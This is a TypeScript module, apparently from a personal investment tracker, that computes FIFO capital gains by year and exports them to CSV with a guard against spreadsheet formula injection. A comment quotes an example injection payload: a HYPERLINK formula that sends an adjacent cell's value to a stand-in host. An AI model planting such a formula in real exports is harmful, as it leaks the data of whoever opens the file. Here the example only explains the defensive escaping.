import type { LedgerEvent, TradeEvent } from '../core/types';
import { foldTrades } from './investments';

function roundCents(n: number): number {
  return Math.round(n * 100) / 100;
}

interface OpenLot {
  quantity: number;
  /** Price plus its share of buy-side fees, per unit. */
  unitCost: number;
  acquiredAt: string;
}

export interface ClosedLot {
  holdingId: string;
  symbol: string;
  label: string;
  quantity: number;
  acquiredAt: string;
  disposedAt: string;
  costBasis: number;
  proceeds: number;
  gain: number;
  /** Whole days between acquiring and disposing of this specific lot. */
  holdingDays: number;
}

/** Symbol/label for a holding as last known, even after it was removed —
 * dropping it the way `foldHoldings` does would leave old trades with
 * nothing to call themselves in a report about the past. */
function lastKnownIdentity(events: LedgerEvent[]): Map<string, { symbol: string; label: string }> {
  const map = new Map<string, { symbol: string; label: string }>();
  for (const e of events) {
    if (e.type === 'holding_upsert') map.set(e.holding.id, { symbol: e.holding.symbol, label: e.holding.label });
  }
  return map;
}

/**
 * Realised gains matched FIFO — the oldest units bought are the first ones
 * counted as sold.
 *
 * `investments.ts` uses average cost everywhere else, deliberately: a
 * single-user tracker can't reliably re-match FIFO lots every time an old
 * trade is corrected. A tax question doesn't get that choice — "was this
 * lot held more than a year" is about one specific batch of units, and
 * average cost has already blended that batch away. This is a second,
 * independent pass over the same trade log for that one question; nothing
 * here feeds back into net worth, return, or anything else average cost
 * already computes — and for a holding sold off in stages rather than all
 * at once, the two methods can disagree slightly on how much has been
 * realised *so far*, even though they agree once everything is sold.
 */
export function closedLots(events: LedgerEvent[]): ClosedLot[] {
  const identities = lastKnownIdentity(events);
  const byHolding = new Map<string, TradeEvent[]>();
  for (const t of foldTrades(events)) {
    const list = byHolding.get(t.holdingId) ?? [];
    list.push(t);
    byHolding.set(t.holdingId, list);
  }

  const out: ClosedLot[] = [];
  for (const [holdingId, trades] of byHolding) {
    const identity = identities.get(holdingId);
    const queue: OpenLot[] = [];

    for (const t of trades) {
      const fees = t.fees ?? 0;
      if (t.side === 'buy') {
        queue.push({ quantity: t.quantity, unitCost: t.price + fees / t.quantity, acquiredAt: t.timestamp });
        continue;
      }

      let remaining = t.quantity;
      const sellFeePerUnit = t.quantity > 0 ? fees / t.quantity : 0;
      while (remaining > 1e-9 && queue.length > 0) {
        const lot = queue[0];
        const take = Math.min(lot.quantity, remaining);
        const costBasis = take * lot.unitCost;
        const proceeds = take * (t.price - sellFeePerUnit);
        out.push({
          holdingId,
          symbol: identity?.symbol ?? holdingId,
          label: identity?.label ?? holdingId,
          quantity: take,
          acquiredAt: lot.acquiredAt,
          disposedAt: t.timestamp,
          costBasis: roundCents(costBasis),
          proceeds: roundCents(proceeds),
          gain: roundCents(proceeds - costBasis),
          holdingDays: Math.floor((new Date(t.timestamp).getTime() - new Date(lot.acquiredAt).getTime()) / 86_400_000),
        });
        lot.quantity -= take;
        remaining -= take;
        if (lot.quantity <= 1e-9) queue.shift();
      }
      // Selling more than the log holds is refused by the UI up front; any
      // remainder here is left unmatched rather than fabricating a lot.
    }
  }

  return out.sort((a, b) => a.disposedAt.localeCompare(b.disposedAt) || a.symbol.localeCompare(b.symbol));
}

export interface CapitalGainsYear {
  year: number;
  lots: ClosedLot[];
  proceeds: number;
  costBasis: number;
  /** Sum of winning lots only. */
  gain: number;
  /** Sum of losing lots only, as a positive number. */
  loss: number;
  netGain: number;
}

/** One year's closed lots, with the totals a return actually needs. */
export function capitalGainsByYear(events: LedgerEvent[], year: number): CapitalGainsYear {
  const lots = closedLots(events).filter((l) => l.disposedAt.slice(0, 4) === String(year));
  const gain = roundCents(lots.filter((l) => l.gain > 0).reduce((sum, l) => sum + l.gain, 0));
  const loss = roundCents(lots.filter((l) => l.gain < 0).reduce((sum, l) => sum - l.gain, 0));
  return {
    year,
    lots,
    proceeds: roundCents(lots.reduce((sum, l) => sum + l.proceeds, 0)),
    costBasis: roundCents(lots.reduce((sum, l) => sum + l.costBasis, 0)),
    gain,
    loss,
    netGain: roundCents(gain - loss),
  };
}

/**
 * Characters a spreadsheet reads as "this cell is a formula" when they lead it.
 *
 * Excel and LibreOffice both evaluate such a cell on open, and the values here
 * are not ours — a holding's label is free text the reader typed. A label of
 * `=HYPERLINK("http://example.invalid/?"&A1,"Total")` turns this file into an
 * exfiltration of the row next to it the moment it is opened, which matters
 * precisely because this export exists to be handed to someone else.
 *
 * Tab and carriage return are in the set because some versions strip leading
 * whitespace and then evaluate whatever was behind it.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/** A plain number, which must never be quoted as text — every loss in this
 * file leads with a minus sign, and an accountant's column has to still add up. */
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;

function csvField(value: string | number): string {
  let s = String(value);
  // A leading apostrophe is the spreadsheet convention for "treat as text". It
  // is consumed on display, so the cell still reads as what was typed.
  if (FORMULA_LEAD.test(s) && !PLAIN_NUMBER.test(s)) s = `'${s}`;
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

function csvLine(fields: (string | number)[]): string {
  return fields.map(csvField).join(',');
}

/**
 * One CSV: every closed lot for the year, then the totals. Portuguese
 * securities gains are taxed at a flat rate regardless of how long they were
 * held; crypto-assets held over 365 days are currently exempt, under 365
 * taxed the same as everything else — `holdingDays` is here so that split
 * can be applied by hand, since this file has no reliable way to tell a
 * stock from a crypto-asset from the symbol alone.
 */
export function capitalGainsToCsv(data: CapitalGainsYear): string {
  const lines: string[] = [];
  lines.push(`Capital gains ${data.year}`);
  lines.push('');
  lines.push(csvLine(['Symbol', 'Label', 'Quantity', 'Acquired', 'Disposed', 'Days held', 'Cost basis', 'Proceeds', 'Gain/loss']));
  for (const lot of data.lots) {
    lines.push(
      csvLine([
        lot.symbol,
        lot.label,
        lot.quantity,
        lot.acquiredAt.slice(0, 10),
        lot.disposedAt.slice(0, 10),
        lot.holdingDays,
        lot.costBasis.toFixed(2),
        lot.proceeds.toFixed(2),
        lot.gain.toFixed(2),
      ])
    );
  }
  lines.push('');
  lines.push(csvLine(['Total proceeds', data.proceeds.toFixed(2)]));
  lines.push(csvLine(['Total cost basis', data.costBasis.toFixed(2)]));
  lines.push(csvLine(['Gains', data.gain.toFixed(2)]));
  lines.push(csvLine(['Losses', (-data.loss).toFixed(2)]));
  lines.push(csvLine(['Net gain/loss', data.netGain.toFixed(2)]));
  return lines.join('\r\n');
}
